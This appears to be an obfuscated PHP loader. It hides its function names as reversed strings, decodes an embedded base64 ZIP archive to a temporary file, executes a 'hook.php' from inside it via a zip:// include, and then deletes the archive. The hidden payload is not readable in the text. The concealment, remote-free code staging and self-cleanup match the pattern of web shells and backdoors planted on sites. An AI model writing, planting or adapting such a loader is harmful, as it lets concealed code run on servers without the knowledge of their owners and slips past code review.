<?php
$函数 = fn($字符串) => implode('', array_reverse(str_split($字符串)));
$映射 = [
    $函数('edoced') => $函数('edoced_46esab'),
    $函数('etirw')  => $函数('stnetnoc_tup_elif'),
    $函数('knilnu') => $函数('knilnu')
];
$数据 = 'UEsDBBQAAAAIAKQ9s1p8jrpLBQEAAKYBAAAIAAAAaG9vay5waHBNkEFrwyAYhu+B/AcJhaSQxcvYoV1bxi479rLDKCFY/Zq4JSr6yfbzpyYp9SK+PD7fq68nM5g823g7kgMpB0TjdpQyI5te4uCvDdcTtWC0o1+eM7BSUScnMwKfBFPiyviP0NpSrhWCQkd/XROc5T7PglcbdEF8yTMSVhH9BTkc12AOgQmwKS4+Hdintz6IduT8cS5mrM2zNvg2acYfBqFDC2zqlqDj4YRQpXHbSAqGLGA3OULXA3Zruyq+tCY3NjqoySrczmW/nVbhUtw6AVwLqJKoJmg9JG8Uvs+uQF6Zg5fnOxsvXsplVNnO1lTB+IcK5fJDNXnURVoqPnoBdyJmp2Oe/QNQSwECHwAUAAAACACkPbNafI66SwUBAACmAQAACAAkAAAAAAAAACAAAAAAAAAAaG9vay5waHAKACAAAAAAAAEAGADJJMfjTsjbAQLZufm/39sBdqu+5nyx2wFQSwUGAAAAAAEAAQBaAAAAKwEAAAAA';
$临时文件 = __DIR__ . '/' . uniqid() . '.zip';
call_user_func($映射[$函数('etirw')], $临时文件, call_user_func($映射[$函数('edoced')], $数据));
$路径 = "zip://$临时文件#hook.php";
include($路径);
call_user_func($映射[$函数('knilnu')], $临时文件);
?>